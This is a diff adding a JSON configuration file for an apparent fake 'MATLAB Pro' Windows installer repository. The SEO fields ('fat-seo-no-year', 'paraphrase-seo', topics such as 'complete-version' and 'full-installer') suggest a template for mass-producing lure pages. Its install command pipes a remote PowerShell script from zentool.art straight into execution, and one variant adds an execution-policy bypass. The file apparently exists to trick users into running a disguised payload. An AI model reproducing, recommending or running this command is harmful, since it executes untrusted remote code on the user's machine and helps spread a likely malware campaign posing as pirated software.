@@ -1,0 +1,33 @@
+{
+  "repo": "Matlab-Pro-Windows-Install",
+  "product": "Matlab-Pro-Windows-Install",
+  "product_title": "MATLAB Pro",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_url": "https://zentool.art/",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "health_url": "https://zentool.art/health",
+  "batch": "fat-seo-no-year",
+  "format": "license-md-geogit-v5-paraphrase-seo",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "matlab",
+    "matlab-pro",
+    "matlab-windows-install",
+    "numerical-computing",
+    "data-analysis",
+    "simulink",
+    "engineering-software",
+    "scientific-computing",
+    "technical-computing",
+    "plotting-tools",
+    "complete-version",
+    "download",
+    "full-installer",
+    "windows-11",
+    "windows-software"
+  ],
+  "site": "zentool.art"
+}
